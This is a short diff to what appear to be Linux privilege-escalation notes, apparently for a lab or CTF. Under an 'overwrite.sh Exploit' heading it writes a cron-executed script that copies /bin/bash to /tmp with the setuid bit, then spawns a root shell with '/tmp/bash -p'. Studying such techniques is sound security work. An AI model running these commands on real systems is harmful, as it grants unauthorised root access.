@@ -48,10 +48,10 @@ cat /etc/cron.deny*
           
    ## overwrite.sh Exploit
       
-         mkdir /home/user/overwrite.sh
-         echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
-         chmod +x /home/user/overwrite.sh
-         /tmp/bash -p
+       touch /home/user/overwrite.sh
+       echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+       chmod +x /home/user/overwrite.sh
+       /tmp/bash -p
 
 
 
